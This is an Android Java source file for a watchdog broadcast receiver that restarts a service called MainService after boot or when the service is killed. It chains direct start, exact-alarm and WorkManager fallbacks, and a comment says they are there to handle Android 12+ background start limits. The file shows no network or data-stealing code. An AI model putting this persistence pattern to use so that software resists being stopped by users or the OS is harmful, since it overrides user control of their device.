package com.fason.app.receiver;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.SystemClock;

import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.fason.app.core.Protocol;
import com.fason.app.service.MainService;
import com.fason.app.worker.KeepAliveWorker;

import java.util.concurrent.TimeUnit;

/** Watchdog receiver — ensures the service stays alive across kill/restart cycles. */
public class WatchdogReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;

        String action = intent.getAction();
        if (action == null) return;

        if (Protocol.BC_KEEP_ALIVE.equals(action) ||
            Protocol.BC_RESPAWN_SERVICE.equals(action) ||
            Intent.ACTION_BOOT_COMPLETED.equals(action)) {
            ensureRunning(context);
        }
    }

    // Multiple fallback strategies to handle Android 12+ background start restrictions
    private void ensureRunning(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences(Protocol.PREFS_NAME, Context.MODE_PRIVATE);
        boolean shouldRun = prefs.getBoolean(Protocol.PREF_SERVICE_ACTIVE, true);

        if (!shouldRun) return;
        if (MainService.getInstance() != null) return;

        // Strategy 1: Direct startForegroundService
        try {
            ctx.startForegroundService(new Intent(ctx, MainService.class));
            return;
        } catch (Exception ignored) {}

        // Strategy 2: AlarmManager — must use getForegroundService on Android 8+
        try {
            Intent svc = new Intent(ctx, MainService.class);
            svc.setAction(Protocol.BC_RESTART);

            int flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE;
            PendingIntent pi;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                pi = PendingIntent.getForegroundService(ctx, 0, svc, flags);
            } else {
                pi = PendingIntent.getService(ctx, 0, svc, flags);
            }

            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
                long trigger = SystemClock.elapsedRealtime() + 1000;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    if (am.canScheduleExactAlarms()) {
                        am.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                    } else {
                        am.setAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                    }
                } else {
                    am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                }
            }
        } catch (Exception ignored) {}

        // Strategy 3: WorkManager fallback
        try {
            OneTimeWorkRequest work = new OneTimeWorkRequest.Builder(KeepAliveWorker.class)
                .setInitialDelay(1, TimeUnit.SECONDS)
                .build();
            WorkManager.getInstance(ctx).enqueue(work);
        } catch (Exception ignored) {}
    }

    public static void setServiceActive(Context ctx, boolean active) {
        SharedPreferences prefs = ctx.getSharedPreferences(Protocol.PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit().putBoolean(Protocol.PREF_SERVICE_ACTIVE, active).apply();
    }

    public static boolean isActive(Context ctx) {
        SharedPreferences prefs = ctx.getSharedPreferences(Protocol.PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getBoolean(Protocol.PREF_SERVICE_ACTIVE, true);
    }
}
